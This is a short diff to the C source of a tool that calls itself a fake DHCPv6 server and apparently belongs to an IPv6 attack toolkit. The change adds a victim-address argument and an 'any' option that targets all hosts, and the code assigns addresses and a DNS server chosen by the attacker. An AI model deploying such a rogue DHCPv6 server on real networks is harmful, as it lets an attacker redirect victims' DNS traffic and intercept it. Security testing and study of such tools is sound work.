@@ -14,7 +14,7 @@
 
 void help(char *prg) {
   printf("%s %s (c) 2017 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
-  printf("Syntax: %s interface network-address/prefix-length dns-server [dhcp-server-ip-address [mac-address]]\n\n", prg);
+  printf("Syntax: %s interface network-address/prefix-length dns-server [victim-address [dhcp-server-ip-address [mac-address]]]\n\n", prg);
   printf("Fake DHCPv6 server. Use to configure an address and set a DNS server\n");
   exit(-1);
 }
@@ -22,7 +22,7 @@ void help(char *prg) {
 int main(int argc, char *argv[]) {
   char *routerip, *interface, mac[16] = "";
   char rdatabuf[1024], wdatabuf[1024], cmsgbuf[1024], mybuf[1024];
-  unsigned char *victimip6, *routerip6, *mac6 = mac, *ip6, *ptr, *ptr1, *ptr2, *ptr3;
+  unsigned char *victimip6, *routerip6, *mac6 = mac, *ip6, *ptr, *ptr1, *ptr2, *ptr3, *any = "any";
   unsigned char *dns;
   int size, fromlen = 0, /*mtu = 1500, */ i, j, k, l, m, s, len, t, mlen, csize = 0;
   static struct iovec iov;
@@ -203,7 +203,7 @@ int main(int argc, char *argv[]) {
         break;
       }
       printf("Received DHCP6 %s packet from %s\n", ptr1, ptr2);
-      if(victimip6 == NULL)
+      if(victimip6 == NULL || strcmp(any, victimip6)==0)
       	printf("Warning: attacking all IPs, this is not safe\n");
       else {
 	      if(strcmp(ptr2, victimip6)!=0){
